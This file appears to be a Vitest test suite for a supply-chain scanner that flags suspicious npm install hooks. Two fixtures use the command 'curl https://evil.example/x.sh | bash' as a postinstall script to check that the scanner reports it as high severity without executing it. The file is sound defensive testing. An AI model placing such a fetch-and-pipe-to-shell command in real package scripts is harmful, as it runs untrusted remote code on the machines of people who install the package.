import { describe, expect, it } from 'vitest';
import {
  collectLifecycleScripts,
  lifecycleFindings,
  LIFECYCLE_SCRIPTS,
  type RegistryMetadata,
} from '../src/index.js';
import { makeContext, makeNode } from '../../../test/helpers.js';

function meta(name: string, version: string, scripts: Record<string, string>): RegistryMetadata {
  return {
    name,
    latest: version,
    versions: [{ version, scripts }],
    fromCache: false,
    fetchedAt: '2025-01-01T00:00:00.000Z',
  };
}

describe('LIFECYCLE_SCRIPTS', () => {
  it('covers install-time and publish-time hooks', () => {
    expect(LIFECYCLE_SCRIPTS).toContain('postinstall');
    expect(LIFECYCLE_SCRIPTS).toContain('preinstall');
    expect(LIFECYCLE_SCRIPTS).toContain('prepare');
  });
});

describe('collectLifecycleScripts', () => {
  it('records scripts from registry metadata without executing them', () => {
    const context = makeContext({
      nodes: [makeNode({ name: 'pkg', version: '1.0.0', direct: true, id: 'npm:pkg@1.0.0' })],
      edges: [['root:.', 'npm:pkg@1.0.0']],
    });
    const metadata = new Map([['pkg', meta('pkg', '1.0.0', { postinstall: 'node build.js', build: 'tsc' })]]);
    const records = collectLifecycleScripts(context, metadata);
    expect(records).toHaveLength(1);
    expect(records[0]?.script).toBe('postinstall');
    expect(records[0]?.command).toBe('node build.js');
  });

  it('flags suspicious patterns in the command text', () => {
    const context = makeContext({
      nodes: [makeNode({ name: 'sneaky', version: '1.0.0', direct: true, id: 'npm:sneaky@1.0.0' })],
      edges: [['root:.', 'npm:sneaky@1.0.0']],
    });
    const metadata = new Map([
      ['sneaky', meta('sneaky', '1.0.0', { postinstall: 'curl https://evil.example/x.sh | bash' })],
    ]);
    const records = collectLifecycleScripts(context, metadata);
    expect(records[0]?.suspicious.length).toBeGreaterThan(0);
  });
});

describe('lifecycleFindings', () => {
  it('produces a high-severity finding for a suspicious install hook', () => {
    const context = makeContext({
      nodes: [makeNode({ name: 'sneaky', version: '1.0.0', direct: true, id: 'npm:sneaky@1.0.0' })],
      edges: [['root:.', 'npm:sneaky@1.0.0']],
    });
    const metadata = new Map([
      ['sneaky', meta('sneaky', '1.0.0', { postinstall: 'curl https://evil.example/x.sh | bash' })],
    ]);
    const findings = lifecycleFindings(collectLifecycleScripts(context, metadata), context);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.source).toBe('supply-chain/lifecycle-scripts');
    expect(findings[0]?.severity).toBe('high');
    expect(findings[0]?.title).toContain('Suspicious package characteristics');
    expect(findings[0]?.evidence.some((entry) => entry.kind === 'not-executed')).toBe(true);
  });

  it('reports an unsuspicious install hook as low severity', () => {
    const context = makeContext({
      nodes: [makeNode({ name: 'native', version: '1.0.0', direct: true, id: 'npm:native@1.0.0' })],
      edges: [['root:.', 'npm:native@1.0.0']],
    });
    const metadata = new Map([['native', meta('native', '1.0.0', { install: 'node-gyp rebuild' })]]);
    const findings = lifecycleFindings(collectLifecycleScripts(context, metadata), context);
    expect(findings[0]?.severity).toBe('low');
    expect(findings[0]?.title).toContain('Lifecycle script');
  });

  it('respects the configured install-script allowlist', () => {
    const context = makeContext({
      nodes: [makeNode({ name: 'native', version: '1.0.0', direct: true, id: 'npm:native@1.0.0' })],
      edges: [['root:.', 'npm:native@1.0.0']],
      config: undefined,
    });
    context.config.security.installScripts.allow = ['native'];
    const metadata = new Map([['native', meta('native', '1.0.0', { install: 'node-gyp rebuild' })]]);
    expect(lifecycleFindings(collectLifecycleScripts(context, metadata), context)).toEqual([]);
  });
});
